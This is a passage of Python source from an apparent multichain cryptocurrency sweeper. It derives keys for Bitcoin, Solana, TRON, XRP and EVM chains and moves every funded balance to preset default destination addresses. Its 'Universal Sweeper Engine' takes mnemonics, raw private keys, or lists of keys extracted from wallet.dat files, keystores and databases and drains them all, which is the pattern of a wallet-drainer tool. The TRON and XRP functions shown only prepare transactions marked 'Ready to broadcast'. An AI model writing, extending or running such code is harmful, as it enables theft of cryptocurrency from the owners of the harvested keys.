                'chain': 'TRON',
                'symbol': 'TRX',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': balance_sun,
                'balance_formatted': f"{(balance_sun / 1e6):.6f} TRX",
                'amount_formatted': '0.000000 TRX',
                'error': 'Balance insufficient to cover bandwidth fee'
            }

        sweep_sun = balance_sun - fee_sun
        return {
            'success': True,
            'chain': 'TRON',
            'symbol': 'TRX',
            'from_address': from_address,
            'to_address': destination_address,
            'amount_wei': sweep_sun,
            'amount_formatted': f"{(sweep_sun / 1e6):.6f} TRX",
            'status': 'Ready to broadcast'
        }
    except Exception as e:
        return {
            'success': False,
            'chain': 'TRON',
            'symbol': 'TRX',
            'from_address': from_address,
            'to_address': destination_address,
            'balance_formatted': '0.000000 TRX',
            'amount_formatted': '0.000000 TRX',
            'error': str(e)
        }


def sweep_xrp(
    from_address: str,
    private_key_hex: str,
    destination_address: str = DEFAULT_DESTINATIONS.get('xrp', '')
) -> Dict[str, Any]:
    """
    Check XRP balance and prepare/execute sweep to destination via xrplcluster.
    """
    if not destination_address:
        return {
            'success': False,
            'chain': 'XRP',
            'symbol': 'XRP',
            'from_address': from_address,
            'to_address': '',
            'balance_formatted': '0.000000 XRP',
            'amount_formatted': '0.000000 XRP',
            'error': 'No XRP destination address specified'
        }
    try:
        payload = {
            'method': 'account_info',
            'params': [{'account': from_address, 'ledger_index': 'validated', 'strict': True}]
        }
        req = urllib.request.Request(
            'https://xrplcluster.com/',
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'User-Agent': 'HDWallet-Sweeper/1.0'}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            res = data.get('result', {})

        if res.get('error') in ('actNotFound', 'Account not found.'):
            return {
                'success': False,
                'chain': 'XRP',
                'symbol': 'XRP',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': 0,
                'balance_formatted': '0.000000 XRP',
                'amount_formatted': '0.000000 XRP',
                'error': 'Account not activated or zero balance on XRPL'
            }

        acc_data = res.get('account_data', {})
        drops = int(acc_data.get('Balance', 0))
        seq = acc_data.get('Sequence', 0)
        flags = res.get('account_flags', {})

        reserve_drops = 10_000_000
        fee_drops = 12

        if drops <= fee_drops:
            return {
                'success': False,
                'chain': 'XRP',
                'symbol': 'XRP',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': drops,
                'balance_formatted': f"{(drops / 1e6):.6f} XRP",
                'amount_formatted': '0.000000 XRP',
                'error': 'Zero available XRP balance'
            }

        sweep_drops = drops - fee_drops
        if flags.get('disableMasterKey'):
            return {
                'success': False,
                'chain': 'XRP',
                'symbol': 'XRP',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': drops,
                'balance_formatted': f"{(drops / 1e6):.6f} XRP",
                'amount_formatted': f"{(sweep_drops / 1e6):.6f} XRP",
                'error': f"Master Key Disabled on XRPL. Requires RegularKey ({acc_data.get('RegularKey', 'Multisig')})"
            }

        return {
            'success': True,
            'chain': 'XRP',
            'symbol': 'XRP',
            'from_address': from_address,
            'to_address': destination_address,
            'balance_wei': drops,
            'balance_formatted': f"{(drops / 1e6):.6f} XRP",
            'amount_wei': sweep_drops,
            'amount_formatted': f"{(sweep_drops / 1e6):.6f} XRP",
            'sequence': seq,
            'fee_drops': fee_drops,
            'status': 'Ready to broadcast'
        }
    except Exception as e:
        return {
            'success': False,
            'chain': 'XRP',
            'symbol': 'XRP',
            'from_address': from_address,
            'to_address': destination_address,
            'balance_formatted': '0.000000 XRP',
            'amount_formatted': '0.000000 XRP',
            'error': str(e)
        }


def sweep_all_multichain(
    mnemonic: str,
    passphrase: str = "",
    destinations: Optional[Dict[str, str]] = None
) -> List[Dict[str, Any]]:
    """
    Sweep across EVM chains, Bitcoin, Solana, TRON, and XRP using configured destinations.
    """
    from .wallet import HDWallet

    dests = destinations or DEFAULT_DESTINATIONS
    dest_evm = dests.get('evm', DEFAULT_DESTINATIONS['evm'])
    dest_btc = dests.get('btc', DEFAULT_DESTINATIONS['btc'])
    dest_sol = dests.get('sol', DEFAULT_DESTINATIONS['sol'])
    dest_trx = dests.get('trx', DEFAULT_DESTINATIONS['trx'])
    dest_xrp = dests.get('xrp', DEFAULT_DESTINATIONS.get('xrp', ''))

    w = HDWallet(mnemonic, passphrase=passphrase, network="bitcoin")
    
    # 1. EVM Keys
    k_eth = w.derive_key("m/44'/60'/0'/0/0")
    eth_priv = k_eth.get('privateKeyHex', '')

    # 2. Bitcoin Keys
    k_btc84 = w.derive_key("m/84'/0'/0'/0/0")
    btc_addr = k_btc84.get('addressP2WPKH', '')
    btc_wif = k_btc84.get('privateKeyWif', '')

    # 3. Solana Keys
    k_sol = w.derive_key("m/44'/501'/0'/0'")
    sol_addr = k_sol.get('addressSOL', '')
    sol_priv = k_sol.get('privateKeyHex', '')

    # 4. TRON Keys
    k_trx = w.derive_key("m/44'/195'/0'/0/0")
    trx_addr = k_trx.get('addressTRX', '')
    trx_priv = k_trx.get('privateKeyHex', '')

    # 5. XRP Keys
    k_xrp = w.derive_key("m/44'/144'/0'/0/0")
    xrp_addr = k_xrp.get('addressXRP', '')
    xrp_priv = k_xrp.get('privateKeyHex', '')

    results = []

    # Bitcoin
    results.append(sweep_btc(btc_addr, btc_wif, dest_btc))

    # Solana
    results.append(sweep_sol(sol_addr, sol_priv, dest_sol))

    # TRON
    results.append(sweep_trx(trx_addr, trx_priv, dest_trx))

    # XRP
    results.append(sweep_xrp(xrp_addr, xrp_priv, dest_xrp))

    # All EVM Chains
    for chain_key in EVM_SWEEP_CHAINS:
        res = sweep_evm(eth_priv, dest_evm, chain_key)
        results.append(res)

    return results


def sweep_all_evm_chains(
    private_key_hex: str,
    destination_address: str = DEFAULT_DESTINATIONS['evm']
) -> List[Dict[str, Any]]:
    results = []
    for chain_key in EVM_SWEEP_CHAINS:
        res = sweep_evm(private_key_hex, destination_address, chain_key)
        results.append(res)
    return results


def sweep_loaded_wallet(
    source_data: Any,
    destinations: Optional[Dict[str, str]] = None,
    passphrase: str = ""
) -> List[Dict[str, Any]]:
    """
    Universal Sweeper Engine.
    Accepts ANY loaded wallet source:
      - 12/24-word BIP-39 Mnemonic Phrase
      - Single WIF or Hex Private Key
      - List of key dicts (e.g. from wallet.dat, Web3 keystores, SQLite database, or text imports)
    Sweeps all funded assets directly into the configured destination addresses.
    """
    import re
    import base58
    from .bip39 import validate_mnemonic
    from .bip32 import BIP32Node
    from .addresses import pubkey_to_p2wpkh, pubkey_to_p2pkh, pubkey_to_ethereum

    dests = destinations or DEFAULT_DESTINATIONS
    dest_evm = dests.get('evm', DEFAULT_DESTINATIONS['evm'])
    dest_btc = dests.get('btc', DEFAULT_DESTINATIONS['btc'])
    dest_sol = dests.get('sol', DEFAULT_DESTINATIONS['sol'])
    dest_trx = dests.get('trx', DEFAULT_DESTINATIONS['trx'])
    dest_xrp = dests.get('xrp', DEFAULT_DESTINATIONS.get('xrp', ''))

    results = []

    # Case 1: String input (Mnemonic, WIF, or Hex Key)
    if isinstance(source_data, str):
        clean_src = source_data.strip()
        
        # 1a. BIP-39 Mnemonic
        if validate_mnemonic(clean_src):
            return sweep_all_multichain(clean_src, passphrase=passphrase, destinations=dests)

        # 1b. Bitcoin WIF (5..., K..., L...)
        if len(clean_src) in (51, 52) and clean_src[0] in '5KL':
            try:
                raw = base58.b58decode_check(clean_src)
                priv = raw[1:33]
                comp = (len(raw) == 34 and raw[-1] == 0x01)
                sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
                vk = sk.get_verifying_key()
                assert vk is not None
                pt = vk.pubkey.point
                pub = (b'\x02' if pt.y() % 2 == 0 else b'\x03') + pt.x().to_bytes(32, 'big') if comp else (b'\x04' + pt.x().to_bytes(32, 'big') + pt.y().to_bytes(32, 'big'))
                addr_p2pkh = pubkey_to_p2pkh(pub)
                addr_p2wpkh = pubkey_to_p2wpkh(pub) if comp else ""

                # Try sweeping legacy P2PKH and Native SegWit
                res_btc = sweep_btc(addr_p2pkh, clean_src, dest_btc)
                results.append(res_btc)
                if addr_p2wpkh and addr_p2wpkh != addr_p2pkh:
                    res_segwit = sweep_btc(addr_p2wpkh, clean_src, dest_btc)
                    results.append(res_segwit)
                return results
            except Exception as e:
                return [{'success': False, 'chain': 'Bitcoin', 'symbol': 'BTC', 'error': f"Invalid WIF: {e}"}]

        # 1c. Hex Private Key (32 bytes / 64 hex chars)
        clean_hex = clean_src.lower().removeprefix('0x')
        if len(clean_hex) == 64 and all(c in '0123456789abcdef' for c in clean_hex):
            # Sweep all EVM chains
            evm_res = sweep_all_evm_chains(clean_hex, dest_evm)
            results.extend(evm_res)

            # Derive Bitcoin WIF and sweep Bitcoin
            try:
                priv_b = bytes.fromhex(clean_hex)
                wif_comp = base58.b58encode_check(b'\x80' + priv_b + b'\x01').decode()
                sk = ecdsa.SigningKey.from_string(priv_b, curve=ecdsa.SECP256k1)
                vk = sk.get_verifying_key()
                assert vk is not None
                pt = vk.pubkey.point
                pub_c = (b'\x02' if pt.y() % 2 == 0 else b'\x03') + pt.x().to_bytes(32, 'big')
                btc_addr = pubkey_to_p2wpkh(pub_c)
                btc_res = sweep_btc(btc_addr, wif_comp, dest_btc)
                results.append(btc_res)
            except Exception:
                pass
            return results

    # Case 2: List of extracted keys (from wallet.dat, keystores, or database import)
    if isinstance(source_data, list):
        for item in source_data:
            if not isinstance(item, dict):
                continue
            addr = item.get('address') or item.get('addr') or ''
            wif = item.get('wif') or ''
            priv_hex = item.get('private_key') or item.get('privkey') or item.get('priv') or ''
            chain = item.get('chain') or item.get('type') or 'BTC'

            if wif and wif != 'N/A' and not wif.startswith('Encrypted') and not wif.startswith('Address Book'):
                res = sweep_btc(addr, wif, dest_btc)
                results.append(res)
            elif priv_hex and len(priv_hex.removeprefix('0x')) == 64:
                res_evm = sweep_evm(priv_hex, dest_evm, 'ethereum')
                results.append(res_evm)

    # Case 3: Dictionary container
    if isinstance(source_data, dict):
        if source_data.get('mnemonic'):
            return sweep_all_multichain(source_data['mnemonic'], passphrase=passphrase, destinations=dests)
        keys_list = source_data.get('keys') or source_data.get('unencrypted_keys') or source_data.get('extracted_addresses')
        if keys_list:
            return sweep_loaded_wallet(keys_list, destinations=dests, passphrase=passphrase)

    return results

